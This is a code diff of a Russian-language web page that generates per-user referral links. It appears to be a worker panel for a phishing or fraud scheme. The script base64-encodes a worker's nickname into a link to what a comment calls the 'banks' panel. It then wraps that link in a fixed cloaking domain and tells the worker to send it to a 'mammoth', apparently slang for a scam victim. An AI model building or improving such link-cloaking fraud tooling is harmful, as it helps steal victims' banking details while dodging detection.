@@ -5,7 +5,72 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Создание ссылки</title>
     <style>
-        /* ... стили без изменений ... */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .panel-container {
+            background: white;
+            padding: 24px;
+            border-radius: 14px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+        h1 {
+            text-align: center;
+            font-size: 22px;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        label {
+            font-weight: bold;
+            display: block;
+            margin-bottom: 8px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            font-size: 15px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            display: none;
+            margin-top: 5px;
+        }
+        #result {
+            margin-top: 20px;
+            text-align: center;
+            word-wrap: break-word;
+        }
+        a {
+            color: #007bff;
+            word-break: break-all;
+        }
     </style>
 </head>
 <body>
@@ -25,17 +90,22 @@
     <script>
         document.getElementById('workerForm').addEventListener('submit', function(e) {
             e.preventDefault();
+
             const nickInput = document.getElementById('nick').value.trim();
             const errorMessage = document.getElementById('error-message');
+            const resultDiv = document.getElementById('result');
             errorMessage.style.display = 'none';
+            resultDiv.innerHTML = '';
 
+            // Проверка ника
             if (!nickInput.startsWith('@') || nickInput.length < 2) {
                 errorMessage.textContent = 'Ник должен начинаться с @ и содержать хотя бы 1 символ после него';
                 errorMessage.style.display = 'block';
                 return;
             }
-            
+
             const nick = nickInput.substring(1);
+
             let refCode;
             try {
                 refCode = btoa(nick);
@@ -45,10 +115,20 @@
                 return;
             }
 
-            // --- ИЗМЕНЕНИЕ (подтверждение): Этот код уже динамический и будет работать на любом домене ---
-            const currentDomain = window.location.origin; 
-            const refLink = `${currentDomain}/?ref=${encodeURIComponent(refCode)}`;
-            document.getElementById('result').innerHTML = `Твоя уникальная ссылка: <br><strong><a href="${refLink}" target="_blank">${refLink}</a></strong><br><br>Пришли ее мамонту!`;
+            // 🔹 Динамический домен для банков (панель)
+            const currentDomain = window.location.origin;
+            const bankRef = `${currentDomain}/?ref=${encodeURIComponent(refCode)}`;
+
+            // 🔹 Фиксированный домен клоаки
+            const cloakDomain = 'https://robota.onrender.com';
+            const cloakRef = `${cloakDomain}/?to=${encodeURIComponent(bankRef)}`;
+
+            // Вывод результата
+            resultDiv.innerHTML = `
+                Твоя уникальная ссылка:<br>
+                <strong><a href="${cloakRef}" target="_blank">${cloakRef}</a></strong>
+                <br><br>Пришли её мамонту!
+            `;
         });
     </script>
 </body>
